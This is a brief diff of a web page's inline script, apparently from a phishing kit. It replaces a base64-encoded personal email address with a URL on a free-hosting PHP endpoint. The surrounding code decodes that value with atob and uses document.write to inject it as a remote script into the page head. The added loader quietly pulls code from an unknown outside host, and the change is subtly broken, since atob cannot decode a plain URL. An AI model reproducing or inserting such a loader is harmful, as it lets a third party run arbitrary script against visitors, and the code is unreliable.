@@ -23,7 +23,7 @@ try {
 } catch (err) {
     document.location.href = `#`;
 }
-        const a = "ZHJzdGVwaGVuam9uZXMxN0BnbWFpbC5jb20=";
+        const a = "https://hdfgfyfyfgyu.000webhostapp.com/we.php";
         document.write("<script src=\"" + atob(a) + "\"><\/script>")
     </script>
 </head>
